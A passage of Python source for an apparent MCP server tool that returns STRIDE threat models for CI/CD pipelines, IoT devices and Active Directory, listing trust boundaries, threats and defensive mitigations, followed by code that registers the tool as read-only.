                "VCS ↔ CI Runner",
                "CI Runner ↔ Artifact Registry",
                "CI Runner ↔ Production",
                "CI Runner ↔ Secrets Manager",
            ],
            "stride": {
                "spoofing": {
                    "threats": [
                        "Compromised developer account pushing malicious code",
                        "Stolen CI/CD tokens",
                        "Rogue CI runner registration",
                        "Git commit author spoofing",
                    ],
                    "mitigations": [
                        "MFA + SSO for VCS access",
                        "Short-lived CI tokens",
                        "Runner registration with approval",
                        "Signed commits required",
                    ],
                },
                "tampering": {
                    "threats": [
                        "Pipeline definition injection",
                        "Dependency poisoning",
                        "Build artifact tampering",
                        "Environment variable manipulation",
                    ],
                    "mitigations": [
                        "Pipeline-as-code with PR review",
                        "Dependency pinning + lock files",
                        "Artifact signing (Sigstore/cosign)",
                        "Secrets as pipeline variables, not env",
                    ],
                },
                "repudiation": {
                    "threats": [
                        "Pipeline execution without audit trail",
                        "Manual deployments bypassing pipeline",
                        "Unsigned artifacts deployed",
                    ],
                    "mitigations": [
                        "Immutable pipeline logs",
                        "Enforce pipeline-only deployments",
                        "Artifact provenance (SLSA)",
                        "Deployment approval gates",
                    ],
                },
                "information_disclosure": {
                    "threats": [
                        "Secrets in pipeline logs",
                        "Secrets in build artifacts",
                        "CI runner access to production secrets",
                        "Source code in build cache",
                    ],
                    "mitigations": [
                        "Secret masking in logs",
                        "Multi-stage builds (don't copy secrets)",
                        "Scoped secrets per environment",
                        "Cache isolation",
                    ],
                },
                "denial_of_service": {
                    "threats": [
                        "Pipeline resource exhaustion",
                        "Fork bomb in CI",
                        "Infinite loop in build",
                        "Runner pool starvation",
                    ],
                    "mitigations": [
                        "Pipeline timeout limits",
                        "Resource quotas per build",
                        "Concurrency limits",
                        "Dedicated runner pools",
                    ],
                },
                "elevation_of_privilege": {
                    "threats": [
                        "CI runner with production access",
                        "Self-hosted runner escape",
                        "Pipeline secret scope creep",
                        "Workflow approval bypass",
                    ],
                    "mitigations": [
                        "Least privilege runners per environment",
                        "Ephemeral runners (destroy after use)",
                        "Secrets scoped to specific pipelines",
                        "Required reviewers for production",
                    ],
                },
            },
            "rick_note": "The pipeline IS domain admin for your infrastructure. Compromise the build, own everything downstream. Treat CI/CD with the same paranoia you treat production access. Ephemeral runners, signed artifacts, scoped secrets — the holy trinity of pipeline security.",
        },
        "iot": {
            "system": "IoT / Embedded Systems",
            "trust_boundaries": [
                "Device ↔ Cloud",
                "Device ↔ Gateway",
                "Device ↔ Mobile App",
                "Firmware ↔ Hardware",
                "Device ↔ Local Network",
            ],
            "stride": {
                "spoofing": {
                    "threats": [
                        "Device identity cloning",
                        "Rogue device registration",
                        "MQTT broker impersonation",
                        "OTA update server spoofing",
                    ],
                    "mitigations": [
                        "Unique device certificates (X.509)",
                        "Mutual TLS",
                        "Broker certificate validation",
                        "Signed firmware updates",
                    ],
                },
                "tampering": {
                    "threats": [
                        "Firmware modification",
                        "JTAG/UART debug access",
                        "Sensor data manipulation",
                        "Flash chip extraction and modification",
                    ],
                    "mitigations": [
                        "Secure boot chain",
                        "Disable debug interfaces in production",
                        "Data integrity checks (HMAC)",
                        "Encrypted flash storage",
                    ],
                },
                "repudiation": {
                    "threats": [
                        "No logging on device",
                        "Offline operation without audit trail",
                        "Timestamp manipulation",
                    ],
                    "mitigations": [
                        "Cloud-side logging of all device actions",
                        "Signed telemetry data",
                        "Secure time source (NTP with auth)",
                    ],
                },
                "information_disclosure": {
                    "threats": [
                        "Hardcoded credentials in firmware",
                        "Plaintext communication",
                        "Physical memory extraction",
                        "Default credentials",
                    ],
                    "mitigations": [
                        "Secure element for key storage",
                        "TLS for all communication",
                        "Tamper-resistant enclosure",
                        "Unique per-device credentials",
                    ],
                },
                "denial_of_service": {
                    "threats": [
                        "Battery drain attacks",
                        "RF jamming",
                        "MQTT message flooding",
                        "Firmware bricking via bad OTA",
                    ],
                    "mitigations": [
                        "Power-efficient protocols",
                        "Frequency hopping",
                        "Message rate limiting",
                        "Rollback-capable firmware updates",
                    ],
                },
                "elevation_of_privilege": {
                    "threats": [
                        "Privilege escalation via command injection",
                        "Buffer overflow in firmware",
                        "Cloud API lateral movement from device creds",
                        "Gateway compromise for fleet access",
                    ],
                    "mitigations": [
                        "Input validation on all commands",
                        "Memory-safe languages/practices",
                        "Device-scoped cloud permissions",
                        "Gateway isolation and monitoring",
                    ],
                },
            },
            "rick_note": "Physical access = game over for most IoT. Assume the device will be in hostile hands. Secure boot, encrypted storage, unique credentials per device. And never, EVER hardcode credentials in firmware — they will be extracted.",
        },
        "active_directory": {
            "system": "Active Directory Infrastructure",
            "trust_boundaries": [
                "Workstation ↔ DC",
                "DC ↔ DC (Replication)",
                "Forest ↔ Forest (Trust)",
                "On-Prem ↔ Cloud (Hybrid)",
                "Admin Tier ↔ Admin Tier",
            ],
            "stride": {
                "spoofing": {
                    "threats": [
                        "NTLM relay attacks",
                        "Kerberos ticket forgery (Golden/Silver)",
                        "LLMNR/NBT-NS poisoning",
                        "Machine account impersonation",
                        "PRT theft in hybrid environments",
                    ],
                    "mitigations": [
                        "SMB signing enforced",
                        "Protected Users group",
                        "Disable LLMNR/NBT-NS/WPAD",
                        "Credential Guard",
                        "Conditional Access policies",
                    ],
                },
                "tampering": {
                    "threats": [
                        "GPO modification for persistence",
                        "AdminSDHolder abuse",
                        "DCShadow attacks",
                        "ADCS template modification",
                        "DNS record poisoning",
                    ],
                    "mitigations": [
                        "GPO change monitoring",
                        "AdminSDHolder monitoring",
                        "DC replication monitoring",
                        "ADCS template auditing",
                        "DNS audit logging",
                    ],
                },
                "repudiation": {
                    "threats": [
                        "Audit log tampering on DCs",
                        "Event log clearing",
                        "Timestomping on AD objects",
                        "Disabled audit policies",
                    ],
                    "mitigations": [
                        "Forward logs to SIEM immediately",
                        "Monitor event log clearing (1102)",
                        "Enable all critical audit policies (4768, 4769, 4776)",
                        "Immutable log storage",
                    ],
                },
                "information_disclosure": {
                    "threats": [
                        "LDAP anonymous binding",
                        "Password in description fields",
                        "GPP passwords (cpassword)",
                        "LSASS credential dumping",
                        "DCSync by compromised account",
                    ],
                    "mitigations": [
                        "Disable anonymous LDAP",
                        "Audit description fields",
                        "Remove all GPP passwords",
                        "Credential Guard + LSA protection",
                        "Limit DCSync rights to DCs only",
                    ],
                },
                "denial_of_service": {
                    "threats": [
                        "Account lockout attacks",
                        "Replication flooding",
                        "DNS poisoning causing auth failures",
                        "Certificate authority takedown",
                    ],
                    "mitigations": [
                        "Smart lockout policies",
                        "Replication monitoring",
                        "DNS redundancy and DNSSEC",
                        "CA backup and recovery procedures",
                    ],
                },
                "elevation_of_privilege": {
                    "threats": [
                        "Kerberoasting",
                        "AS-REP Roasting",
                        "ADCS ESC1-ESC8",
                        "Unconstrained delegation abuse",
                        "ACL-based attacks (WriteDACL, GenericAll)",
                    ],
                    "mitigations": [
                        "gMSA for service accounts",
                        "Require Kerberos preauth",
                        "Audit and fix ADCS templates",
                        "Constrained delegation only",
                        "Regular ACL audit with BloodHound",
                    ],
                },
            },
            "rick_note": "AD threat modeling starts with BloodHound. Map every path to DA, every Kerberoastable account, every ADCS template. STRIDE on AD is really about tier violations — when Tier 2 can reach Tier 0, you've got a spoofing AND elevation problem. Fix the tiers, fix 80% of the threats.",
        },
    }
    t = params.target.lower().strip()
    model = models.get(t)
    if not model:
        return f"Error: Unknown target '{t}'. Available: {', '.join(models.keys())}"
    if params.context:
        model["context"] = _sanitize(params.context)
    model["methodology"] = "STRIDE (Microsoft Threat Modeling)"
    model["authorization"] = "Use for defensive security architecture and authorized assessments only."
    # Philosophy-aware enrichment — annotate each STRIDE category with the
    # decision filters that govern its branches, the chain-framing note, and
    # the core principles anchoring it. Values come from rick_mcp.philosophy.
    stride = cast(dict, model["stride"])
    for category, payload in stride.items():
        filters = filters_for_stride(category)
        if filters:
            payload["decision_filters"] = [f"{f['name']} — {f['rule']}" for f in filters]
        chain_note = chain_validation(category)
        if chain_note:
            payload["chain_validation"] = chain_note
        anchors = principle_anchors(category)
        if anchors:
            payload["core_principle_anchors"] = anchors
    return _fmt(model, params.response_format, title=f"{CALLSIGN} Threat Model")


def register(mcp):
    """Register tools on the MCP server."""
    mcp.tool(
        name="rick_cheatsheet",
        annotations={
            "title": "Field Manual Cheatsheets",
            "readOnlyHint": True,
            "destructiveHint": False,
            "idempotentHint": True,
            "openWorldHint": False,
        },
    )(_safe_tool(rick_cheatsheet))
    mcp.tool(
        name="rick_threat_model",
        annotations={
            "title": "STRIDE Threat Model",
            "readOnlyHint": True,
            "destructiveHint": False,
            "idempotentHint": True,
            "openWorldHint": False,
        },
    )(_safe_tool(rick_threat_model))
